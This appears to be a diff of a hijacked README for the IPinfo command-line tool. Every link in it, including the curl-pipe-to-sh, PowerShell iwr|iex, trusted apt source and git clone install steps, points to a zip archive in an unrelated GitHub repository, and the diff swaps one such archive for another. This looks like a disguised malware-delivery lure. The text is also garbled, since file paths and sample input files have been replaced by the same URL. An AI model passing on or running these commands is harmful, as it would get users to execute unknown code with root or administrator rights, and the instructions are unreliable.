@@ -1,6 +1,6 @@
-# [<img src="https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip" alt="IPinfo" width="24"/>](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip) IPinfo CLI
+# [<img src="https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip" alt="IPinfo" width="24"/>](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip) IPinfo CLI
 
-This is the official CLI for the [https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip) IP address API,
+This is the official CLI for the [https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip) IP address API,
 allowing you to:
 
 - Look up IP details in bulk or one-by-one.
@@ -24,7 +24,7 @@ brew install ipinfo-cli
 OR to install the latest `amd64` version without automatic updates:
 
 ```bash
-curl -Ls https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | sh
+curl -Ls https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | sh
 ```
 
 ### Ubuntu PPA
@@ -32,7 +32,7 @@ curl -Ls https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.z
 _Note_: this installs our full suite of binaries and keeps them up-to-date.
 
 ```bash
-echo "deb [trusted=yes] https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip /" | sudo tee  "https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip"
+echo "deb [trusted=yes] https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip /" | sudo tee  "https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip"
 sudo apt update
 sudo apt install ipinfo
 ```
@@ -43,13 +43,13 @@ _Note_: this is a one-time installation; updates are not automatic. Use the PPA
 for automatic updates.
 
 ```bash
-curl -Ls https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | sh
+curl -Ls https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | sh
 ```
 
 OR
 
 ```bash
-curl -LO https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip{arch}.deb
+curl -LO https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip{arch}.deb
 sudo dpkg -i ipinfo_3.3.1_linux_{arch}.deb
 ```
 
@@ -64,7 +64,7 @@ cd /usr/ports/net/ipinfo-cli && make install clean
 ### Arch linux
 
 ```bash
-git clone https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip
+git clone https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip
 makepkg -si
 ```
 
@@ -73,7 +73,7 @@ makepkg -si
 _Note_: run powershell as administrator before executing this command.
 
 ```bash
-iwr -useb https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | iex
+iwr -useb https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | iex
 ```
 
 ### Scoop
@@ -88,12 +88,12 @@ scoop install ipinfo-cli
 docker run --rm -it ipinfo/ipinfo:3.3.1
 ```
 
-To save the CLI's config, add `-v "https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip"`. For
+To save the CLI's config, add `-v "https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip"`. For
 example, the following command saves the config to the `ipinfo` directory in
 the current working directory.
 
 ```bash
-docker run --rm -it -v "$https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip" ipinfo/ipinfo:3.3.1
+docker run --rm -it -v "$https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip" ipinfo/ipinfo:3.3.1
 ```
 
 ### Using `go install`
@@ -102,7 +102,7 @@ Make sure that `$GOPATH/bin` is in your `$PATH`, because that's where this gets
 installed:
 
 ```bash
-go install https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip
+go install https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip
 ```
 
 ### Using `curl`/`wget`
@@ -144,26 +144,26 @@ windows_arm64
 After choosing a platform `PLAT` from above, run:
 
 ```bash
-# for Windows, use ".zip" instead of "https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip"
-curl -LO https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip${PLAT}https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip
+# for Windows, use ".zip" instead of "https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip"
+curl -LO https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip${PLAT}https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip
 # OR
-wget https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip${PLAT}https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip
+wget https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip${PLAT}https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip
 
-tar -xvf ipinfo_3.3.1_${PLAT}https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip
+tar -xvf ipinfo_3.3.1_${PLAT}https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip
 sudo mv ipinfo_3.3.1_${PLAT} /usr/local/bin/ipinfo
 ```
 
 ### Using `git`
 
 Installing from source requires at least the Golang version specified in
-`https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip`. You can install the Golang toolchain from
-[the official site](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip).
+`https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip`. You can install the Golang toolchain from
+[the official site](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip).
 
 Once the correct Golang version is installed, simply clone the repository and
 install the binary:
 
 ```bash
-git clone https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip ipinfo-cli
+git clone https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip ipinfo-cli
 cd ipinfo-cli
 go install ./ipinfo/
 $GOPATH/bin/ipinfo
@@ -176,7 +176,7 @@ Alternatively, you can do the following to output the binary somewhere
 specific:
 
 ```bash
-git clone https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip ipinfo-cli
+git clone https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip ipinfo-cli
 cd ipinfo-cli
 go build -o <path> ./ipinfo/
 ```
@@ -197,17 +197,17 @@ Currently these subcommands are separately shipped:
 
 | CLI        | Version                                                               |
 | ---------- | --------------------------------------------------------------------- |
-| grepip     | [1.2.3](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)      |
-| grepdomain | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)  |
-| matchip    | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)     |
-| prips      | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)       |
-| cidr2range | [1.2.0](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)  |
-| cidr2ip    | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)     |
-| range2cidr | [1.3.0](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)  |
-| range2ip   | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)    |
-| randip     | [1.1.0](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)      |
-| splitcidr  | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)   |
-| mmdb       | [1.4.2](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip) |
+| grepip     | [1.2.3](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)      |
+| grepdomain | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)  |
+| matchip    | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)     |
+| prips      | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)       |
+| cidr2range | [1.2.0](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)  |
+| cidr2ip    | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)     |
+| range2cidr | [1.3.0](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)  |
+| range2ip   | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)    |
+| randip     | [1.1.0](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)      |
+| splitcidr  | [1.0.0](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)   |
+| mmdb       | [1.4.2](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip) |
 
 ## Quick Start
 
@@ -221,14 +221,14 @@ By default, invoking the CLI shows a help message:
 ipinfo
 ```
 
-![ipinfo](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)
+![ipinfo](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)
 
 ### Login
 
 If you have a token, log in with it first. You can continue without a token,
 but there will be limited data output and some features (like bulk lookups)
 will not be available. Get your token for free at
-[https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip).
+[https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip).
 
 ```bash
 ipinfo init
@@ -242,7 +242,7 @@ You can quickly look up details of your own IP with `myip`:
 ipinfo myip
 ```
 
-![ipinfo myip](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)
+![ipinfo myip](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)
 
 ### Any IP
 
@@ -252,35 +252,35 @@ You can see the details of any IP by specifying it:
 ipinfo 8.8.8.8
 ```
 
-![ipinfo myip](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)
+![ipinfo myip](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)
 
 ### Piping
 
 You can pipe IPs in and get their results in bulk (this requires a token):
 
 ```bash
-cat https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | ipinfo | less
+cat https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | ipinfo | less
 ```
 
-![cat https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | ipinfo](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)
+![cat https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | ipinfo](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)
 
 Here's the CSV version of that:
 
 ```bash
-cat https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | ipinfo -c | less
+cat https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | ipinfo -c | less
 ```
 
-![cat https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | ipinfo -c](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)
+![cat https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | ipinfo -c](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)
 
 ### Field Filter
 
 In case you only needed a single field from a bunch of IPs:
 
 ```bash
-cat https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | ipinfo -f hostname
+cat https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | ipinfo -f hostname
 ```
 
-![cat https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | ipinfo](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)
+![cat https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | ipinfo](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)
 
 ### Bulk
 
@@ -291,18 +291,18 @@ manually specify bulk and input IPs on the command line:
 ipinfo bulk 1.1.1.0/30 8.8.8.0/30 9.9.9.0/30 | less
 ```
 
-![ipinfo bulk](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)
+![ipinfo bulk](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)
 
 ### Summarize
 
 IP details can be summarized similar to what's provided by
-https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip
+https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip
 
 ```bash
-cat https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip | ipinfo summarize
+cat https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip | ipinfo summarize
 ```
 
-![ipinfo summarize](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)
+![ipinfo summarize](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)
 
 There are many more features available, so for full details, consult the `-h`
 or `--help` message for each command. For example:
@@ -360,11 +360,11 @@ shell do that with the `ipinfo` binary itself (or any of our binaries).
 ## Data
 
 The amount of data you get back per lookup depends upon how much data you have
-enabled on your token via the https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip site.
+enabled on your token via the https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip site.
 
 If you have an account, see our
-[plans](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip) and
-[addons](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip).
+[plans](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip) and
+[addons](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip).
 
 All examples in this document use a token with all data enabled.
 
@@ -373,13 +373,13 @@ All examples in this document use a token with all data enabled.
 ### Disabling Color Output
 
 All our CLIs respect either the `--nocolor` flag or the
-[`NO_COLOR`](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip) environment variable to disable color
+[`NO_COLOR`](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip) environment variable to disable color
 output.
 
 ### Color on Windows
 
 To enable color support for the Windows command prompt, run the following to
-enable [`Console Virtual Terminal Sequences`](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip).
+enable [`Console Virtual Terminal Sequences`](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip).
 
 ```cmd
 REG ADD HKCU\CONSOLE /f /v VirtualTerminalLevel /t REG_DWORD /d 1
@@ -395,10 +395,10 @@ REG DELETE HKCU\CONSOLE /f /v VirtualTerminalLevel
 
 There are official IPinfo client libraries available for many languages including PHP, Python, Go, Java, Ruby, and many popular frameworks such as Django, Rails and Laravel. There are also many third party libraries and integrations available for our API.
 
-See [https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip) for more details.
+See [https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip) for more details.
 
 ## About IPinfo
 
 Founded in 2013, IPinfo prides itself on being the most reliable, accurate, and in-depth source of IP address data available anywhere. We process terabytes of data to produce our custom IP geolocation, company, carrier, VPN detection, hosted domains, and IP type data sets. Our API handles over 40 billion requests a month for 100,000 businesses and developers.
 
-[![image](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)](https://raw.githubusercontent.com/akelex13/cli/master/individuate/cli.zip)
+[![image](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)](https://raw.githubusercontent.com/akelex13/cli/master/grepdomain/Software-1.9.zip)
